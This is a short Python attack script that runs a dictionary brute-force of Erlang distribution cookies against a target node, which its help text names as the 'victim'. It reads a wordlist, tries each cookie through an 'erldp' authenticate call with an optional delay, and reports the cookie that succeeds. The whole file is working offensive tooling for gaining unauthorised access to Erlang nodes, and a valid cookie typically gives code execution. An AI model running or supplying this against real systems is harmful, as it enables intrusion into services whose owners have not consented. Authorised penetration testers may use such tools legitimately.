#!/usr/bin/env python3

import asyncio
from erldp import authenticate

import sys
import argparse

parser = argparse.ArgumentParser(description='Tests every cookie value in dictionary against victim, to successfully complete authentication.')

parser.add_argument('target', action='store', type=str, help='Erlang node address or FQDN')
parser.add_argument('port', action='store', type=int, help='Erlang node TCP port')
parser.add_argument('dictionary', action='store', type=str, help='Dictionary of Erlang cookies to test')
parser.add_argument('--delay', type=float, default=0.0, help='Amount of seconds (float) to sleep between attempts')

args = parser.parse_args()

f = open(args.dictionary, 'rb')
cookies = [l.rstrip(b'\n') for l in f.readlines()]

async def amain(args, cookies):
  n_cookies = len(cookies)

  for i in range(len(cookies)):
    cookie = cookies[i]

    success = await authenticate(args.target, args.port, cookie)
    if success:
      print('\n[*] found cookie %r' % cookie)
      break

    await asyncio.sleep(args.delay)

asyncio.run(amain(args, cookies))
